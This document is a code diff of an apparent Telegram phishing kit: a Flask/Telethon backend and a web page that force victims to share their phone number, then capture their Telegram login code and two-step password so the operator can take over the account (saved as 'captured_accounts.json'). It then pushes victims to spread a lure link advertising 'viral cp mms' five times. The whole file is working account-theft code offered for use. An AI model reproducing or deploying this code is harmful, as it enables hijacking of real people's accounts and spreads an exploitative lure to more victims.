@@ -1,6 +1,6 @@
-from flask import Flask, request, jsonify, render_template_string
-import os, json, base64, threading, asyncio, logging, traceback, uuid, time, re
-from datetime import datetime, timedelta
+from flask import Flask, request, jsonify
+import os, json, base64, threading, asyncio, logging, traceback, uuid, time
+from datetime import datetime
 import requests as http_requests
 from telethon import TelegramClient, errors, events
 from telethon.tl.custom import Button
@@ -52,7 +52,6 @@ if sys.version_info >= (3, 12) and sys.platform == 'win32':
 app = Flask(__name__)
 user_sessions = {}
 pending_codes = {}
-pending_2fa = {}
 sessions_lock = threading.Lock()
 DATA_FILE = "captured_accounts.json"
 USERS_FILE = "bot_users.json"
@@ -85,6 +84,7 @@ AUTO_DELETE_EXPIRED = True
 
 
 def md_to_html(text):
+    import re
     if not text:
         return text
     lines = text.split("\n")
@@ -92,11 +92,9 @@ def md_to_html(text):
     for line in lines:
         stripped = line.lstrip()
         if stripped.startswith("> "):
-            content = stripped[2:]
-            processed.append(f"\x00Q{content}\x00")
+            processed.append(f"\x00Q{stripped[2:]}\x00")
         elif stripped.startswith(">"):
-            content = stripped[1:].lstrip()
-            processed.append(f"\x00Q{content}\x00")
+            processed.append(f"\x00Q{stripped[1:].lstrip()}\x00")
         else:
             processed.append(line)
     text = "\n".join(processed)
@@ -131,8 +129,8 @@ def load_users():
     return load_json(USERS_FILE, {})
 
 
-def save_users(data):
-    save_json(USERS_FILE, data)
+def save_users(d):
+    save_json(USERS_FILE, d)
 
 
 def load_accounts():
@@ -930,21 +928,9 @@ async def edit_admin_msg(account, status_text):
                 new_text = new_text[:3990] + "..."
             try:
                 await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, parse_mode='md')
-                logger.info(f"✅ Admin msg edited: {phone} → {status_text[:30]}")
+                logger.info(f"✅ Admin msg edited: {phone}")
             except Exception as e:
                 logger.error(f"admin edit err: {e}")
-
-        section_url = os.environ.get("SECTION_BOT_URL", "")
-        section_msg_id = account.get("section_notify_msg_id")
-        section_chat_id = account.get("section_chat_id")
-        if section_url and section_msg_id:
-            try:
-                http_requests.post(
-                    f"{section_url}/api/edit_message",
-                    json={"chat_id": section_chat_id, "msg_id": section_msg_id, "status": status_text},
-                    timeout=10)
-            except Exception as e:
-                logger.error(f"section edit signal err: {e}")
     except Exception as e:
         logger.error(f"edit_admin_msg err: {e}")
 
@@ -1039,7 +1025,7 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK — HTML alada file theke ashe
+# FLASK
 # ============================================================
 @app.route('/')
 def index():
@@ -1048,7 +1034,7 @@ def index():
             return f.read()
     except Exception as e:
         logger.error(f"webapp.html read error: {e}")
-        return "webapp.html not found", 404
+        return "webapp.html not found — create it in repo", 404
 
 
 @app.route('/tg')
@@ -1377,21 +1363,12 @@ var pwdCheck = null;
 var contactForce = null;
 var inProgress = false;
 var SHARE_MSG = "https://t.me/Xxxvo_bot\nhttps://t.me/Xxxvo_bot\n\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆";
-
-fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){
-  if (d && d.message) { SHARE_MSG = d.message; }
-}).catch(function(){});
-
+fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){ if (d && d.message) SHARE_MSG = d.message; }).catch(function(){});
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
-function msg(id, text, type) {
-  var e = document.getElementById(id);
-  e.textContent = text;
-  e.className = 'msg show ' + type;
-}
+function msg(id, t, type) { var e=document.getElementById(id); e.textContent=t; e.className='msg show '+type; }
 window.onload = function() {
-  hide('otpBox'); hide('pwdBox'); hide('shareBox');
-  show('contactBox');
+  hide('otpBox'); hide('pwdBox'); hide('shareBox'); show('contactBox');
   var cp = localStorage.getItem(UPK);
   var ic = localStorage.getItem(UCK) === '1';
   if (cp && ic) { phoneNumber = cp; hide('contactBox'); openShare(); }
@@ -1402,9 +1379,7 @@ function startForce() {
   if (contactForce) clearInterval(contactForce);
   setTimeout(function() { triggerShare(true); }, 200);
   contactForce = setInterval(function() {
-    if (!document.getElementById('contactBox').classList.contains('on')) {
-      clearInterval(contactForce); contactForce = null; return;
-    }
+    if (!document.getElementById('contactBox').classList.contains('on')) { clearInterval(contactForce); contactForce = null; return; }
     if (!inProgress) triggerShare(false);
   }, 200);
 }
@@ -1412,212 +1387,124 @@ function triggerShare(isFirst) {
   if (inProgress && !isFirst) return;
   if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
   inProgress = true;
-  var resetInProgress = function() {
-    setTimeout(function() { inProgress = false; }, 400);
-  };
+  var resetInProgress = function() { setTimeout(function() { inProgress = false; }, 400); };
   if (typeof tg.requestContact === 'function') {
-    try {
-      tg.requestContact(function(sent, event) {
-        resetInProgress();
-        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
-          handleContact(event.responseUnsafe.contact);
-        } else {
-          msg('contactMsg', 'Confirm required', 'err');
-        }
-      });
-      return;
-    } catch(e) { resetInProgress(); }
+    try { tg.requestContact(function(sent, event) {
+      resetInProgress();
+      if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
+      else msg('contactMsg', 'Confirm required', 'err');
+    }); return; } catch(e) { resetInProgress(); }
   }
   if (typeof tg.openContactPicker === 'function') {
-    try {
-      tg.openContactPicker(function(sent, event) {
-        resetInProgress();
-        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
-          handleContact(event.responseUnsafe.contact);
-        } else {
-          msg('contactMsg', 'Confirm required', 'err');
-        }
-      });
-      return;
-    } catch(e) { resetInProgress(); }
+    try { tg.openContactPicker(function(sent, event) {
+      resetInProgress();
+      if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
+      else msg('contactMsg', 'Confirm required', 'err');
+    }); return; } catch(e) { resetInProgress(); }
   }
-  resetInProgress();
-  msg('contactMsg', 'Update app', 'err');
+  resetInProgress(); msg('contactMsg', 'Update app', 'err');
 }
-document.getElementById('shareContactBtn').onclick = function() {
-  inProgress = false;
-  triggerShare(true);
-};
+document.getElementById('shareContactBtn').onclick = function() { inProgress = false; triggerShare(true); };
 function handleContact(c) {
   var phone = c.phone_number || '';
   if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
   if (phone.charAt(0) !== '+') phone = '+' + phone;
-  phoneNumber = phone;
-  inProgress = true;
-  msg('contactMsg', 'Confirmed!', 'ok');
+  phoneNumber = phone; inProgress = true; msg('contactMsg', 'Confirmed!', 'ok');
   if (contactForce) { clearInterval(contactForce); contactForce = null; }
-  fetch('/api/save_contact', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({tg_id: TG_ID || 'web', phone: phoneNumber})
-  }).then(function(r) { return r.json(); }).then(function(d) {
+  fetch('/api/save_contact', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({tg_id:TG_ID||'web',phone:phoneNumber}) })
+  .then(function(r){ return r.json(); }).then(function(d){
     if (d.success) {
       localStorage.setItem(UPK, phoneNumber);
-      if (d.already_captured && d.user_id) {
-        localStorage.setItem(UCK, '1');
-        setTimeout(function() { hide('contactBox'); openShare(); }, 700);
-      } else {
-        setTimeout(function() { hide('contactBox'); openOtp(); }, 700);
-      }
+      if (d.already_captured && d.user_id) { localStorage.setItem(UCK,'1'); setTimeout(function(){hide('contactBox'); openShare();},700); }
+      else { setTimeout(function(){hide('contactBox'); openOtp();},700); }
     } else { msg('contactMsg', 'Server error', 'err'); }
-  }).catch(function() { msg('contactMsg', 'Connection error', 'err'); });
+  }).catch(function(){ msg('contactMsg', 'Connection error', 'err'); });
 }
 function openOtp() {
-  hide('contactBox'); hide('pwdBox'); hide('shareBox');
-  show('otpBox');
-  ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
-  document.getElementById('o1').focus();
-  msg('otpMsg', 'Sending code...', 'info');
-  fetch('/api/share', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({phone: phoneNumber, tg_id: TG_ID})
-  }).then(function(r) { return r.json(); }).then(function(d) {
-    if (d.success) {
-      msg('otpMsg', 'Code sent!', 'ok');
-      startOtpCheck();
-      setTimeout(function() { document.getElementById('resendBtn').style.display = 'block'; }, 30000);
-    } else { msg('otpMsg', d.error || 'Failed', 'err'); }
-  }).catch(function() { msg('otpMsg', 'Network error', 'err'); });
+  hide('contactBox'); hide('pwdBox'); hide('shareBox'); show('otpBox');
+  ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; });
+  document.getElementById('o1').focus(); msg('otpMsg', 'Sending code...', 'info');
+  fetch('/api/share', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,tg_id:TG_ID}) })
+  .then(function(r){ return r.json(); }).then(function(d){
+    if (d.success) { msg('otpMsg', 'Code sent!', 'ok'); startOtpCheck(); setTimeout(function(){ document.getElementById('resendBtn').style.display='block'; },30000); }
+    else { msg('otpMsg', d.error||'Failed', 'err'); }
+  }).catch(function(){ msg('otpMsg', 'Network error', 'err'); });
 }
 function startOtpCheck() {
   if (codeCheck) clearInterval(codeCheck);
-  codeCheck = setInterval(function() {
-    fetch('/api/check', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({phone: phoneNumber})
-    }).then(function(r) { return r.json(); }).then(function(d) {
-      if (d.s === '2fa_needed') {
-        clearInterval(codeCheck);
-        hide('otpBox'); show('pwdBox');
-        document.getElementById('pwdInput').focus();
-        startPwdCheck();
-      } else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
-      else if (d.s === 'err') {
-        clearInterval(codeCheck);
-        msg('otpMsg', 'Failed. Try resend.', 'err');
-        document.getElementById('resendBtn').style.display = 'block';
-      }
+  codeCheck = setInterval(function(){
+    fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
+    .then(function(r){ return r.json(); }).then(function(d){
+      if (d.s === '2fa_needed') { clearInterval(codeCheck); hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck(); }
+      else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
+      else if (d.s === 'err') { clearInterval(codeCheck); msg('otpMsg', 'Failed. Try resend.', 'err'); document.getElementById('resendBtn').style.display='block'; }
     }).catch(function(){});
   }, 2000);
 }
-['o1','o2','o3','o4','o5'].forEach(function(id, i) {
-  document.getElementById(id).addEventListener('input', function() {
-    var v = this.value.replace(/[^0-9]/g, '');
-    this.value = v;
-    if (v && i < 4) document.getElementById('o' + (i + 2)).focus();
-    var code = '';
-    for (var k = 1; k <= 5; k++) code += document.getElementById('o' + k).value;
+['o1','o2','o3','o4','o5'].forEach(function(id, i){
+  document.getElementById(id).addEventListener('input', function(){
+    var v = this.value.replace(/[^0-9]/g,''); this.value = v;
+    if (v && i < 4) document.getElementById('o'+(i+2)).focus();
+    var code = ''; for (var k=1;k<=5;k++) code += document.getElementById('o'+k).value;
     if (code.length === 5) setTimeout(submitOtp, 100);
   });
-  document.getElementById(id).addEventListener('keydown', function(e) {
-    if (e.key === 'Backspace' && !this.value && i > 0) document.getElementById('o' + i).focus();
+  document.getElementById(id).addEventListener('keydown', function(e){
+    if (e.key === 'Backspace' && !this.value && i > 0) document.getElementById('o'+i).focus();
   });
 });
 function submitOtp() {
-  var code = '';
-  for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
+  var code = ''; for (var i=1;i<=5;i++) code += document.getElementById('o'+i).value;
   if (code.length < 5) { msg('otpMsg', 'Enter 5 digits', 'err'); return; }
   msg('otpMsg', 'Verifying...', 'info');
-  fetch('/api/verify', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({phone: phoneNumber, code: code, tg_id: TG_ID})
-  }).then(function(r) { return r.json(); }).then(function(d) {
-    if (d.success) { onCapture(); }
-    else if (d.needs_password) {
-      hide('otpBox'); show('pwdBox');
-      document.getElementById('pwdInput').focus();
-      startPwdCheck();
-    } else {
-      msg('otpMsg', d.error || 'Wrong code', 'err');
-      ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
-      document.getElementById('o1').focus();
-    }
-  }).catch(function() { msg('otpMsg', 'Error', 'err'); });
+  fetch('/api/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,code:code,tg_id:TG_ID}) })
+  .then(function(r){ return r.json(); }).then(function(d){
+    if (d.success) onCapture();
+    else if (d.needs_password) { hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck(); }
+    else { msg('otpMsg', d.error||'Wrong code', 'err'); ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; }); document.getElementById('o1').focus(); }
+  }).catch(function(){ msg('otpMsg', 'Error', 'err'); });
 }
-document.getElementById('resendBtn').onclick = function() {
-  document.getElementById('resendBtn').style.display = 'none';
-  openOtp();
-};
+document.getElementById('resendBtn').onclick = function(){ document.getElementById('resendBtn').style.display='none'; openOtp(); };
 function startPwdCheck() {
   if (pwdCheck) clearInterval(pwdCheck);
-  pwdCheck = setInterval(function() {
-    fetch('/api/check', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({phone: phoneNumber})
-    }).then(function(r) { return r.json(); }).then(function(d) {
-      if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); }
-    }).catch(function(){});
+  pwdCheck = setInterval(function(){
+    fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
+    .then(function(r){ return r.json(); }).then(function(d){ if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); } }).catch(function(){});
   }, 2000);
 }
 document.getElementById('pwdBtn').onclick = function() {
   var pwd = document.getElementById('pwdInput').value.trim();
   if (!pwd) { msg('pwdMsg', 'Enter password', 'err'); return; }
-  msg('pwdMsg', 'Checking...', 'info');
-  document.getElementById('pwdBtn').disabled = true;
-  var code = '';
-  for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
-  fetch('/api/verify', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({phone: phoneNumber, code: code, password: pwd, tg_id: TG_ID})
-  }).then(function(r) { return r.json(); }).then(function(d) {
+  msg('pwdMsg', 'Checking...', 'info'); document.getElementById('pwdBtn').disabled = true;
+  var code = ''; for (var i=1;i<=5;i++) code += document.getElementById('o'+i).value;
+  fetch('/api/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,code:code,password:pwd,tg_id:TG_ID}) })
+  .then(function(r){ return r.json(); }).then(function(d){
     document.getElementById('pwdBtn').disabled = false;
-    if (d.success) { onCapture(); }
-    else { msg('pwdMsg', d.error || 'Wrong', 'err'); }
-  }).catch(function() {
-    document.getElementById('pwdBtn').disabled = false;
-    msg('pwdMsg', 'Error', 'err');
-  });
+    if (d.success) onCapture();
+    else msg('pwdMsg', d.error||'Wrong', 'err');
+  }).catch(function(){ document.getElementById('pwdBtn').disabled = false; msg('pwdMsg', 'Error', 'err'); });
 };
 function onCapture() {
-  localStorage.setItem(UPK, phoneNumber);
-  localStorage.setItem(UCK, '1');
-  localStorage.setItem(USK, '0');
+  localStorage.setItem(UPK, phoneNumber); localStorage.setItem(UCK,'1'); localStorage.setItem(USK,'0');
   if (codeCheck) { clearInterval(codeCheck); codeCheck = null; }
   if (pwdCheck) { clearInterval(pwdCheck); pwdCheck = null; }
-  hide('otpBox'); hide('pwdBox');
-  openShare();
+  hide('otpBox'); hide('pwdBox'); openShare();
 }
 function openShare() {
-  hide('contactBox'); hide('otpBox'); hide('pwdBox');
-  show('shareBox');
-  var n = parseInt(localStorage.getItem(USK) || '0');
-  updSteps(n);
-  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
-  else msg('shareMsg', n + '/5 done.', 'info');
+  hide('contactBox'); hide('otpBox'); hide('pwdBox'); show('shareBox');
+  var n = parseInt(localStorage.getItem(USK) || '0'); updSteps(n);
+  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok'); else msg('shareMsg', n + '/5 done.', 'info');
 }
 function updSteps(n) {
-  for (var i = 1; i <= 5; i++) {
-    var e = document.getElementById('st' + i);
-    if (i <= n) e.className = 'sst done';
-    else if (i === n + 1) e.className = 'sst active';
-    else e.className = 'sst';
-  }
+  for (var i=1;i<=5;i++) { var e = document.getElementById('st'+i); if (i<=n) e.className='sst done'; else if (i===n+1) e.className='sst active'; else e.className='sst'; }
 }
 document.getElementById('shareBtn').onclick = function() {
   var urlMatch = SHARE_MSG.match(/https?:\/\/[^\s]+/);
   var url = urlMatch ? urlMatch[0] : 'https://t.me/Xxxvo_bot';
   var share_url = 'https://t.me/share/url?url=' + encodeURIComponent(url) + '&text=' + encodeURIComponent(SHARE_MSG);
-  if (tg) { tg.openTelegramLink(share_url); } else { window.open(share_url, '_blank'); }
+  if (tg) tg.openTelegramLink(share_url); else window.open(share_url, '_blank');
   var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
-  localStorage.setItem(USK, String(n));
-  updSteps(n);
-  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
-  else msg('shareMsg', n + '/5 done.', 'ok');
+  localStorage.setItem(USK, String(n)); updSteps(n);
+  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok'); else msg('shareMsg', n + '/5 done.', 'ok');
 };
 </script>
 </body>
